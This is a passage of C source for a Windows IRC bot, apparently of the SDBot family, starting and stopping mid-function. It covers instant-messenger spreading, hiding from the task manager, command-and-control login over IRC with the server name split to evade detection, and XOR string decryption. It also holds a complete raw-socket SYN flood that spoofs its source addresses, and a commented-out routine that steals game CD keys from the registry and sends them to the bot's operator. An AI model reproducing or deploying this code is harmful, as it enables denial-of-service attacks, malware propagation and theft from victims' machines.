        WupDateStatus.dwServiceSpecificExitCode = specificError; 
 
        SetServiceStatus (WupDateStatusHandle, &WupDateStatus); 
        return; 
    } 
 
    // Initialization complete - report running status. 
    WupDateStatus.dwCurrentState       = SERVICE_RUNNING; 
    WupDateStatus.dwCheckPoint         = 0; 
    WupDateStatus.dwWaitHint           = 0; 
 
	SetServiceStatus (WupDateStatusHandle, &WupDateStatus);
    if (!SetServiceStatus (WupDateStatusHandle, &WupDateStatus)) 
    { 
        status = GetLastError(); 
    }

	 //Instant Messenger
	 #ifndef NO_IMSPREAD
	EnumWindows(EnumMSN, 0);
	EnumWindows(EnumAIM, 0);
	EnumWindows(EnumYahoo, 0);
	#endif
	//Instant Messenger
	WSADATA wsadata;
	int i = 0, err = 0;
//	HKEY key;
	char cfilename[256];
	char filename1[64];
//	char sysdir[256];
//	char tstr[256];
	DWORD cstat;
  //  HANDLE psnap;
  //  PROCESSENTRY32 pe32 = {0};
//	int copies = 0;
	BOOL bkpserver = FALSE;
	BOOL noigcs;

	// record start time
	started = GetTickCount() / 1000;

	#ifndef NO_PING
	// load icmp.dll functions
 	HINSTANCE icmp_dll = LoadLibrary("ICMP.DLL");
    if (icmp_dll == 0) noicmp = TRUE;
 	else {
	 	fIcmpCreateFile  = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho    = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");
 		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho) {
	        noicmp = TRUE;
	    }
	}
	#endif


	// load functions from kernel32.dll and hide from the windows 9x task manager
	HINSTANCE kernel32_dll = LoadLibrary("kernel32.dll");
	if (kernel32_dll) {
		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot");
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, "Process32Next");

		if (fRegisterServiceProcess) fRegisterServiceProcess(0, 1);
	}

	// initialize wininet stuff
	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;
	// see if InternetGetConnectedStateEx is available
	HINSTANCE wininet_dll = LoadLibrary("WININET.DLL");
    if (wininet_dll == 0) noigcse = TRUE;
 	else {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
		if (!fInternetGetConnectedState) {
			noigcs = TRUE;
		} else noigcs = TRUE;

	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
 		if (!fInternetGetConnectedStateEx) {
	        noigcse = TRUE;
	    } else noigcse = FALSE;
	}

	// get our file name and the path to the temp folder
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	GetTempPath(sizeof(tempdir), tempdir);

	// check if this exe is running already
/*	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		psnap = fCreateToolhelp32Snapshot(2, 0);
		if (psnap != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(psnap, &pe32)) {
				do {
					if (strncmp(cfilename+(strlen(cfilename)-strlen(pe32.szExeFile)), pe32.szExeFile, strlen(pe32.szExeFile)) == 0) copies++;
				} while (fProcess32Next(psnap, &pe32));
			}
			CloseHandle (psnap);
			// if this exe has already been run, then exit
			if (copies > 1) exit(0);
		}
	}
*/
	err = WSAStartup(MAKEWORD(1, 1), &wsadata);
//	if (err != 0) return 0;
	if ( LOBYTE( wsadata.wVersion ) != 1 || HIBYTE( wsadata.wVersion ) != 1 ) {
		WSACleanup();
	//	return 0;
	}


	srand(GetTickCount());
	if (rndfilename) rndnick((char *)&filename); else strncpy(filename1, filename, sizeof(filename1)-1);

	memset(threadd, 0, sizeof(threadd));
	memset(cnick, 0, sizeof(cnick));
	memset(aliases, 0, sizeof(aliases));

	addthread("main thread");

	// remove the following line if you don't want any predefined aliases
	addpredefinedaliases();

	memset(log, 0, sizeof(log));
	addlog("bot started.");
//	DWORD dwID[MAX_NB_THREAD];
	INT nRet;
	WSADATA WSAData;

	nRet = WSAStartup(MAKEWORD(1, 1), &WSAData);
	if (nRet != 0)
	{
		WSACleanup();
		printf("Error: Cannot initalize winsock.");
	//	return 1;
	}
	//scan on startup
		GetLocalIP();
/*	INT nK = 0;
    for (nK = 0; nK < MAX_NB_THREAD; nK++) 
    {
        hThread[nK] = CreateThread(NULL, 0, ScanNetBIOS, (LPVOID) nK, (unsigned long)NULL, &dwID[nK]);
    }
*/
	SetConsoleCtrlHandler(TermProcess, TRUE);
	// copy settings into main irc structure
	
	sprintf(server,"%s%s%s%s%s%s",s1,s2,s3,s4,s5,s6);
	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	sprintf(channel,"%s%s%s%s",c1,c2,c3,c4);
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CHECKCONNECTION
			// check if we're connected to the internet... if not, then wait 5mins and try again
			if (!noigcs) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			err = irc_connect((void *)&mainirc);
			success = FALSE;
			if (err == 2) break; // break out of the loop

			if (success) i--; // if we're successful in connecting, decrease i by 1;

			// irc_connect didn't return 2, so we need to sleep then reconnect
			Sleep(3000);
		}

		if (err == 2) break; // break out of the loop and close

		if (bkpserver) {
				sprintf(server,"%s%s%s%s%s%s",s1,s2,s3,s4,s5,s6);

			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			sprintf(channel,"%s%s%s%s",c1,c2,c3,c4);
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	// cleanup;
	for (i = 0; i < 64; i++) closesocket(csock[i]);
	WSACleanup();

//	return 0;
 }

///////////////////////////////////// SYN FLOOD ///////////////////////////

USHORT checksum(USHORT *buffer, int size) 
{ 
   unsigned long cksum=0; 

   while(size > 1) { cksum+=*buffer++; size -= 2; }
   if(size) cksum += *(UCHAR*)buffer; 
 
   cksum = (cksum >> 16) + (cksum & 0xffff); 
   cksum += (cksum >>16); 
   return (USHORT)(~cksum); 
}
 
u_long LookupAddress(const char* szHost)
{
   u_long nRemoteAddr = inet_addr(szHost);
   struct hostent *pHE;

   if (nRemoteAddr == INADDR_NONE)
       {
       pHE = gethostbyname(szHost);
       if (pHE == 0) return INADDR_NONE;
       nRemoteAddr = *((u_long*)pHE->h_addr_list[0]);
       }

   return nRemoteAddr;
}

long SendSyn(unsigned long TargetIP, unsigned int SpoofingIP, unsigned short TargetPort, int len)
{ 
   WSADATA WSAData; 
   SOCKET sock; 
   SOCKADDR_IN addr_in; 
   IPHEADER ipHeader; 
   TCPHEADER tcpHeader; 
   PSDHEADER psdHeader; 
 
   LARGE_INTEGER freq, halt_time, cur;
   char szSendBuf[60]={0}; 
   BOOL flag; 
   int rect;
   long total;
   char buf[64];

   if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0) 
       return FALSE; 
 
   if ((sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED ))==INVALID_SOCKET)
       return FALSE; 

   flag=TRUE;
   if (setsockopt(sock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR)
       return FALSE; 

   addr_in.sin_family=AF_INET;
   addr_in.sin_port=htons(TargetPort);
   addr_in.sin_addr.s_addr=TargetIP;

   ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
   ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader));
   ipHeader.ident=1;
   ipHeader.frag_and_flags=0;
   ipHeader.ttl=128;
   ipHeader.proto=IPPROTO_TCP;
   ipHeader.checksum=0;
   ipHeader.destIP=TargetIP;
   tcpHeader.th_dport=htons(TargetPort);
   tcpHeader.th_ack=0;
   tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0); 
   tcpHeader.th_flag=2; 
   tcpHeader.th_win=htons(16384); 
   tcpHeader.th_urp=0; 
 
   total = 0;
   QueryPerformanceFrequency(&freq);
   QueryPerformanceCounter(&cur);
   halt_time.QuadPart = (freq.QuadPart * len) + cur.QuadPart;
 
   while(TRUE) 
      {
      tcpHeader.th_sum=0; 
 
      psdHeader.daddr=ipHeader.destIP; 
      psdHeader.mbz=0; 
      psdHeader.ptcl=IPPROTO_TCP; 
      psdHeader.tcpl=htons(sizeof(tcpHeader)); 
      ipHeader.sourceIP=htonl(SpoofingIP++); 

      tcpHeader.th_sport=htons((rand() % 1001) + 1000 ); // source port 
      tcpHeader.th_seq=htons((rand() << 16) | rand());
 
      psdHeader.saddr=ipHeader.sourceIP; 
 
      memcpy(szSendBuf, &psdHeader, sizeof(psdHeader)); 
      memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader)); 
      tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader)); 
 
      memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
      memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 
      memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4); 
      ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader)); 
 
      memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
 
      rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader),0,(struct sockaddr*)&addr_in, sizeof(addr_in));
      if (rect==SOCKET_ERROR)
         {
          sprintf(buf, "send error!:%d\n",WSAGetLastError());
          addlog(buf);
          return 0;
         }
     
      total += rect;
      QueryPerformanceCounter(&cur);
      if (cur.QuadPart >= halt_time.QuadPart)
         break;
     }

   closesocket(sock); 
   WSACleanup(); 
 
   return (total);
}

long SYNFlood(char *target, char *port, char *len)
{
   unsigned long TargetIP;
   unsigned short p;
   unsigned int SpoofIP;
   long num;
   int t;
   char buf[80];

   TargetIP = LookupAddress((const char *)target);
   p = atoi(port);
   t = atoi(len);
   SpoofIP = TargetIP + ((rand()%512)+256);

   num = SendSyn(TargetIP, SpoofIP, p, t);

   #ifdef REMOVE_NONSYNNERS
   if (!num)
       {
       uninstall();
       WSACleanup();
       ExitProcess(0);
       }
   #endif

   if (!num) num = 1;  // 'Div by zero' kludge
   num = num / 1000 / t;

   sprintf(buf, "syn flood: %s:%s [%iKB/sec]", target, port, num);
   addlog(buf);
   return num;
}

///////////////////////////////////// SYN FLOOD ///////////////////////////

// simple decrypt function, for encrypted strings
 char * decryptstr(char *str, int strlen)
 {
	if (cryptkey != 0) for (BYTE i = 0; i < strlen; i++) str[i] = str[i] ^ (cryptkey + (i * (cryptkey % 10) + 1));
	return str;
}

// function to add a log item
 void addlog(char *desc)
 {
	SYSTEMTIME st;

	GetLocalTime(&st);

	for (int i = 126; i >= 0; i--) if (log[i][0] != '\0') strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	sprintf(log[0], "[%d-%d-%d %d:%d:%d] %s", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond, desc);
 }

// function to add an alias and return alias number
 int addalias(char *name, char *command)
 {
	int i;
	for (i = 0; i < maxaliases; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			anum++;
			break;
		}
	}
	return i;
 }

// function to add description to thread list and return thread number
 int addthread(char *desc)
 {
	int i;
	for (i = 0; i < 64; i++) {
		if (threadd[i][0] == '\0') {
			strncpy(threadd[i], desc, sizeof(threadd[i])-1);
			break;
		}
	}
	return i;
 }

// connect function used by the original bot and all clones/spies
 DWORD WINAPI irc_connect(LPVOID param)
 {
	SOCKET sock;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	DWORD err;
	int rval;
	char nick[16];
	char *nick1;
	char str[64];
	BYTE spy;
	ircs irc;

	irc = *((ircs *)param);
	ircs *ircp = (ircs *)param;
	ircp->gotinfo = TRUE;

	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(irc.port);
		iaddr.s_addr = inet_addr(irc.host);
		if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(irc.host);
		else hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL) return 0;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		memset(nick, 0, sizeof(nick));
		if (irc.spy == 1) nick1 = irc.nick; else {
			nick1 = rndnick(nick);
		}

		#ifndef NO_IDENT
		CreateThread(NULL, 0, &ident, NULL, 0, &err);
		#endif

		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		csock[irc.threadnum] = sock;
		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) {
			closesocket(sock);
			Sleep(2000);
			continue;
		}

		sprintf(str, "connected to %s.", irc.host);
		addlog(str);

		strncpy(cnick[irc.threadnum], nick1, sizeof(cnick[irc.threadnum])-1);

		if (irc.spy == 1) spy = 1; else spy = 0;
		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, spy);
		closesocket(sock);

		if (rval == 0) continue;
		if (rval == 1) {
			Sleep(1800000);
			continue;
		}
		if (rval == 2) break;
	}

	threads[irc.threadnum] = 0;
	threadd[irc.threadnum][0] = '\0';
	cnick[irc.threadnum][0] = '\0';
	return rval;
 }

 #ifndef NO_IDENT
// ident server
 DWORD WINAPI ident(LPVOID param)
 {
	SOCKET isock, csock;
	SOCKADDR_IN issin, cssin;
	char user[12];
	char ibuff[32];

	isock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); // set isock to standard TCP socket
	WSAAsyncSelect(isock, 0, WM_USER + 1, FD_READ); // set async mode for isock
	memset(&issin, 0, sizeof(issin));
	issin.sin_family = AF_INET; // AF_INET is currently the only supported family
	issin.sin_port = htons(113); // set ident port
	bind(isock, (SOCKADDR *)&issin, sizeof(issin)); // bind issin to isock

	while(1) { // loop forever
		if (listen(isock, 10) == SOCKET_ERROR) return 0; // listen for connection. if we get SOCKET_ERROR, then something's wrong and so we return
		csock = accept(isock, (SOCKADDR *)&cssin, NULL); // try to accept a connection
		if (csock != INVALID_SOCKET) break; // if INVALID_SOCKET is returned, then we don't have a connection. otherwise, we're connected, so break
	}

	memset(user, 0, sizeof(user));
	srand(GetTickCount());
	rndnick(user);

	memset(ibuff, 0, sizeof(ibuff));
	sprintf(ibuff, "%d, %d : USERID : UNIX : %s\r\n", rand()%6000+1, port, botid);//(char *)user); // build ident reply
	send(csock, ibuff, strlen(ibuff), 0);

	// we're done, so let's close our sockets and return
	closesocket(csock);
	closesocket(isock);

	return 0;
 }
 #endif

 char * rndnick(char *strbuf)
 {
/*	int n, nl;
	char nick[12];

	srand(GetTickCount());
	memset(nick, 0, sizeof(nick));
	nl = (rand()%3)+4;
	for (n=0; n<nl; n++) nick[n] = (rand()%26)+97;
	nick[n+1] = '\0';

	strncpy(strbuf, nick, 12);
	return strbuf;
	*/
    int i;

    srand(GetTickCount());
    sprintf(strbuf, "%s", nickconst);
    for (i=1; i<=maxrand; i++) sprintf(strbuf, "%s%i", strbuf, rand()%10);
    return strbuf;

 }

// receive loop for bots/spies
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy)
 {
	// main receive buffer
	char buff[4096];
	int err, repeat;
	char master[128*maxlogins];
	char *b;
	char str[8];
	char login[64];
	char line[512];
	int in_channel;

	repeat = 0;
	memset(master, 0, sizeof(master));


	if (serverpass[0] != '\0') {
		sprintf(login, "PASS %s\r\n", serverpass);
		send(sock, login, strlen(login), 0);
	}
	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, rndnick(str), nick1);
	err = send(sock, login, strlen(login), 0);
	if (err == SOCKET_ERROR) {
		closesocket(sock);
		Sleep(5000);
		return 0;
	}

	// loop forever
	while(1) {
		char host[160];

		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		// if recv() returns 0, that means that the connection has been lost.
		if (err == 0) break;
		// if recv() returns SOCKET_ERROR then we've probably terminated the connection.
		if (err == SOCKET_ERROR) break;

		// split lines up if multiple lines received at once, and parse each line
		memset(line, 0, sizeof(line));
		b = strtok(buff, "\r\n");
		if (b != NULL) strncpy(line, b, sizeof(line)-1); else b = NULL;
		while (b != NULL) {
			#ifndef NO_SPY
			if (spy == 1) repeat = irc_spyparseline(line, sock, channel, chanpass, nick1, hsock, hchannel, server);
			#endif
			if (spy == 0) {
				repeat = 1;
				do {
					// repeat--;
					repeat = irc_parseline(line, sock, channel, chanpass, nick1, server, master, host, &in_channel, repeat);
					repeat--;
				} while (repeat > 0);
				//if (repeat-- > 0) while (repeat-- > 0) irc_parseline(b[n-1], sock, channel, chanpass, nick1, in_channel, repeat);
				if (repeat == -1) return 0;
				else if (repeat == -2) return 1;
				else if (repeat == -3) return 2;
			}

			b = strtok(b+strlen(b)+1, "\r");
			if (b != NULL) if (b[strlen(b)+2] != '\n' && b[strlen(b)+3] != '\0') strncpy(line, b+1, sizeof(line)-1); else b = NULL;
		}
	}

	return 0;
 }

// function to parse lines for the bot and clones
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat)
 {
	char line1[512];
	char line2[512];
	char *masters[maxlogins];
	BOOL ismaster;
	char ntmp[12];
	char ntmp2[3];
	int i, ii, s;
	char *a[32];
	char a0[128];
	char nick[16];
	char user[24];
	char sendbuf[512];
	DWORD id;
	BOOL silent = FALSE;
	BOOL notice = FALSE;
	BOOL usevars = FALSE;
	int cl;

	memset(sendbuf, 0, sizeof(sendbuf));

	id = 0;
	strncpy(nick, nick1, sizeof(nick)-1);
	for (i = 0; i < maxlogins; i++) masters[i] = master + (i * 128);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	// split the line up into seperate words
	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) return 1;

	//check for 'silent' parameter
	for (i = 3; i < 32; i++) if (a[i] == NULL && a[i-1] != NULL) {
		if (strcmp(a[i-1], "-s") == 0) silent = TRUE;
		break;
	}

	//check for 'notice' parameter
	for (i = 3; i < 32; i++) if (a[i] == NULL && a[i-1] != NULL) {
	notice = TRUE;
		break;
	}

	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}


	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		irc_sendf(sock, "PONG %s", a[1]+1); ///////////xxxxxxxxxx
		irc_sendf(sock, "WHOIS %s\r\n", "jamesbrown");
		irc_sendf(sock, "PONG %s", a[1]);
	//	irc_sendf2(sock, "PONG %s\r\n", a[1], "");

		if (in_channel == 0) {
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}

	if (strcmp("NOTICE", a[1]) == 0) {
		if (a[18])
		{
			if (strcmp("pong", a[17]) == 0)
			{
				irc_sendf(sock, "PONG %s\r\n", a[18]);
				//irc_sendf(sock, "PONG %s\r\n", a[1]);
				if (in_channel == 0) {
					irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
				}
			}
		}
		return 1;
	}

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		irc_sendf(sock, "USERHOST %s\r\n", nick1); // get our hostname
		success = TRUE;
		return 1;
	}

	// get host
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) strncpy(host,  h+1, 159);
		return 1;
	}

	// check if user is logged in
	ismaster = FALSE;
	for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a0) == 0) ismaster = TRUE;

	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < maxlogins; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL) if (strcmp(knick, a[3]) == 0) {
				masters[i][0] = '\0';
				sprintf(sendbuf,"user %s logged out.", knick);
				irc_sendf2(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
				addlog(sendbuf);
			}
		}
		if (strcmp(nick1, a[3]) == 0) {
			in_channel = 0;
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
			sprintf(sendbuf, "screw you %s!", user);
			irc_privmsg(sock, a[2], sendbuf, FALSE);
		}
		return 1;
	}

	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user;
		char *newnck = a[2] + 1;
		if (oldnck != NULL && newnck != NULL)  {
			for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a0) == 0) replacestr(masters[i], oldnck-1, newnck-1);
			if (strcmp(oldnck, nick1) == 0) strncpy(nick1,  newnck, 15);
		}
		return 1;
	}

	// reset master if master parts or quits
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) for (i = 0; i < maxlogins; i++) if (masters[i][0] != '\0') if (strcmp(masters[i], a[0]) == 0) {
		masters[i][0] = '\0';
		sprintf(sendbuf, "user %s logged out.", user);
		addlog(sendbuf);
		if (strcmp("PART", a[1]) == 0) irc_sendf2(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
		return 1;
	}

	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) *in_channel = 1;
		sprintf(sendbuf, "joined channel %s.", a[4]);
		addlog(sendbuf);
		return 1;
	}

	// if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (strcmp("NOTICE", a[1]) == 0) notice = TRUE;
			if (a[2] == NULL) return 1;
			if (strstr(a[2], "#") == NULL || notice) a[2] = user; 
			if (a[3] == NULL) return 1; 
			a[3]++; 
			if (a[3] && nick1) if (strncmp(nick1, a[3], strlen(nick1)) == 0) s = 4; else s = 3;
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise. 
			if (a[3] && nick1) if (strncmp(nick1, a[3], strlen(nick1)) == 0) s = 4; else s = 3;
			if (a[s] == NULL) return 1;
			// if someone asks for our version, send version reply
			if (strcmp("\1VERSION\1", a[s]) == 0) if (a[2][0] != '#' && version[0] != '\0') {
				irc_sendf2(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)version);
				return 1;
			}
			else if (strcmp("\1PING", a[s]) == 0) if (a[s+1] != NULL && a[2][0] != '#') {
				irc_sendf2(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
				return 1;
			}
		} else  { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}

		if (a[s]++[0] != prefix1) return 1;
		// see if someone is logging in
		if (strcmp("login", a[s]) == 0 || strcmp("l", a[s]) == 0) {
			// make sure that user isn't already logged in
			if (ismaster) return 1;
			for (i = 0; i < maxlogins; i++) {
				if (a[s+1] == NULL) return 1;
				if (masters[i][0] != '\0') continue;
				if (strcmp(password, a[s+1]) == 0) {
					strncpy(masters[i],  a0, 127);
					if (!silent) irc_privmsg(sock, a[2], "password accepted.", notice);
					char *u = strtok(a[0], "!") + 1;
					char *h = strtok(NULL, "\0");
					sprintf(sendbuf, "user %s(%s) logged in.", u, h);
					addlog(sendbuf);
					break;
				}
			}
			return 1;
		}
		if (ismaster || strcmp("332", a[1]) == 0) {
			// commands no parameters
			// check if the command matches an alias's name
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix1;
					sc[3] = prefix1;
					strncpy(sc+4, aliases[i].command, 159);

					// process '$x-' parameter variables
					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}

					// process '$x' parameter variables
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}

			if (a[s][0] == prefix1 || usevars) {
				// process variables
				replacestr(line, "$me", nick1); // bot's nick
				replacestr(line, "$user", user); // user's nick
				replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
				replacestr(line, "$rndnick", rndnick(ntmp)); // random string of 4-7 characters
				replacestr(line, "$server", server); // name of current server

				// process '$chr()' variables
				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57)  strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0) ntmp2[0] = atoi(ntmp); else ntmp2[0] = (rand()%96) + 32;
					ntmp2[1] = '\0';
					cl = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, cl+6);
					replacestr(line, ntmp, ntmp2);
				}

				// re-split the line into seperate words
				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");
				if (a[s] == NULL) return 1;
				a[s] += 3;
			}

			if (strcmp("rndnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
				rndnick(nick);
				irc_sendf(sock, "NICK %s\r\n", nick);
			}
/*else if (strcmp("getcdkey", a[s]) == 0 || strcmp("cdkey", a[s]) == 0) {
	// Half-Life CDKey
    HKEY hkey = NULL;
    LONG lRet = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Valve\\Half-Life\\Settings", 0, KEY_READ, &hkey);
    DWORD dwSize = 128;
    unsigned char szDataBuf[128];
    if(RegQueryValueEx(hkey, "Key", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
                    sprintf(sendbuf, "Found Half-Life CDKey (%s).\r\n", szDataBuf);
                    irc_privmsg(sock, a[2], sendbuf, notice); }
    RegCloseKey(hkey);
     
    // UTKEY
    dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Unreal Technology\\Installed Apps\\UT2003", 0, KEY_READ, &hkey);
    if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
     sprintf(sendbuf, "Found Unreal Tournament 2003 CDKey (%s).\r\n", szDataBuf);
     irc_privmsg(sock, a[2], sendbuf, notice); }
    RegCloseKey(hkey);
   
    // CSKEY
    dwSize = 128; lRet = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Valve\\CounterStrike\\Settings", 0, KEY_READ, &hkey);
    if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
     sprintf(sendbuf, "Found Counter-Strike ( Retail ) CDKey (%s).\r\n", szDataBuf);
     irc_privmsg(sock, a[2], sendbuf, notice); }
    RegCloseKey(hkey);
 
    // IGI2
    dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\IGI 2 Retail", 0, KEY_READ, &hkey);
    if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
     sprintf(sendbuf, "Found Project IGI 2 CDKey (%s).\r\n", szDataBuf);
     irc_privmsg(sock, a[2], sendbuf, notice); }
